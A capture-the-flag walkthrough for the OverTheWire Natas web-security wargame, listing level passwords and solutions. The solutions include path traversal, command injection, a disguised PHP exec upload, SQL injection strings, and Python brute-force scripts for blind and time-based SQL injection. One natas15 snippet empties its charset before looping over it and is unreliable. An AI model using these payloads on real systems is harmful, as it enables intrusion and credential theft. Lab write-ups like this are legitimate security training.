# Natas wargame writeups

Home page: https://overthewire.org/wargames/natas/

## Connect the game

```
http://natas<level>.natas.labs.overthewire.org
```
with `<level>` is your level's room

+ no SSH login
+ all passwords are also stored in `/etc/natas_webpass/natas<level>`

## Notes for game

+ view source, devtools
+ Burpsuite skills
+ php sandbox https://onlinephp.io/

## Walkthrough

| Username | Password |
| :--- | :--- |
| natas0 | natas0 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas1 | g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 |

```
Ctrl+U to view source
```

| Username | Password |
| :--- | :--- |
| natas2 | h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 |

```
Ctrl+U to view source
see an image, but a file folder
http://natas2.natas.labs.overthewire.org/files/users.txt
```

| Username | Password |
| :--- | :--- |
| natas3 | G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q |

```
Ctrl+U to view source
check /robots.txt because google will find it
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

| Username | Password |
| :--- | :--- |
| natas4 | tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm |

```
use BurpSuite catch requests
click Refresh
change Referer: http://natas5.natas.labs.overthewire.org/
```

| Username | Password |
| :--- | :--- |
| natas5 | Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD |

```
use BurpSuite catch requests
change Cookie: loggedin=1
```

| Username | Password |
| :--- | :--- |
| natas6 | fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR |

```
check sourcecode php
http://natas6.natas.labs.overthewire.org/includes/secret.inc
input secret: FOEIUWGHFEEUHOFUOIU
```

| Username | Password |
| :--- | :--- |
| natas7 | jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr |

```
Ctrl+U to view source
path traversal ?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

| Username | Password |
| :--- | :--- |
| natas8 | a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB |

```
check sourcecode php
reverse the code to get secret
<?php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
?>
input secret: oubWYf2kBq
```

| Username | Password |
| :--- | :--- |
| natas9 | Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd |

```
check sourcecode php
command injection
find words containing: ; cat /etc/natas_webpass/natas10;
```

| Username | Password |
| :--- | :--- |
| natas10 | D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE |

```
check sourcecode php
use grep character in many files
find words containing: 11* /etc/natas_webpass/natas11
```

| Username | Password |
| :--- | :--- |
| natas11 | 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg |

```
check sourcecode php
check cookie data
reverse the code to get $key
<?php
$originalString = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$cookieString = base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLX54bjY=');
echo $originalString ^ $cookieString;
?>
rebuild cookie with our payload
<?php
$key = 'KNHL';
$newString = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$cookieData = '';
for ($i = 0; $i < strlen($newString); $i++) {
  $cookieData .= $key[$i % strlen($key)] ^ $newString[$i];
}
echo base64_encode($cookieData);
?>
change cookie data to MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```

| Username | Password |
| :--- | :--- |
| natas12 | YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG |

```
check sourcecode php
create a file natas12.php
<?php
echo exec("cat /etc/natas_webpass/natas13");
?>
inspect and change field input filename to php
upload and go to that file to see result
```

| Username | Password |
| :--- | :--- |
| natas13 | lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 |

```
check sourcecode php
EXIF image type is checked
create a file natas13.php with padding magic bytes
.....<?php
echo exec('cat /etc/natas_webpass/natas14');
?>
edit first 4 hex pairs to FF D8 FF EE (jpeg)
inspect and change field input filename to php
upload and go to that file to see result
```

| Username | Password |
| :--- | :--- |
| natas14 | qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP |

```
check sourcecode php
SQL injection
input username or password: " or 1=1 --
```

| Username | Password |
| :--- | :--- |
| natas15 | TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB |

```
check sourcecode php
try a brute force attack
first, identify the password charset
import requests
target = 'http://natas15.natas.labs.overthewire.org'
charset = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset = ''
for c in charset:
	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
	r = requests.get(target,
		auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
		params={"username": username}
	)
	if "This user exists" in r.text:
		charset += c
		print ('CSET: ' + charset.ljust(len(charset), '*'))
now, brute force attack against previous charset
import requests
target = 'http://natas15.natas.labs.overthewire.org'
charset = "23579adfgijklqruADEHOPRTVZ"
password = ""
while len(password) != 32:
	for c in charset:
		t = password + c
		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
		r = requests.get(target,
			auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
			params={"username": username}
		)
		if "This user exists" in r.text:
			print ('PASS: ' + t.ljust(32, '*'))
			password = t
			break
```

| Username | Password |
| :--- | :--- |
| natas16 | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |

```
check sourcecode php
test input: $(echo Africans)
now, start brute force it
import requests
target = 'http://natas16.natas.labs.overthewire.org'
charset = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
p = ''
i = 0
while len(p) != 32:
	while i < len(charset):
		c = charset[i]
		needle = ('$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Africans' % (p, c))
		r = requests.get(target,
			auth=('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'),
			params={"needle": needle}
		)
		if "Africans" not in r.text:
			p += c
			print ('P: ' + p.ljust(32, '*'))
			i = 0
		else:
			i += 1
```

| Username | Password |
| :--- | :--- |
| natas17 | XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd |

```
check sourcecode php
time-based blind SQL injection
now, start brute force it
import requests
pwd_len = 32
charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset_1 = ''
target = 'http://natas17.natas.labs.overthewire.org'
auth=('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
sleep_time = 10
for c in charset_0:
	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
	r = requests.get(target, auth=auth, params={"username": username}
	)
	s = r.elapsed.total_seconds()
	if s >= sleep_time:
		charset_1 += c
		print ('C: ' + charset_1.ljust(len(charset_0), '*'))
print()
password = ""
while len(password) != pwd_len:
	for c in charset_1:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
		r = requests.get(target, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= sleep_time:
			print ('P: ' + t.ljust(pwd_len, '*'))
			password = t
			break
```

| Username | Password |
| :--- | :--- |
| natas18 |  |
















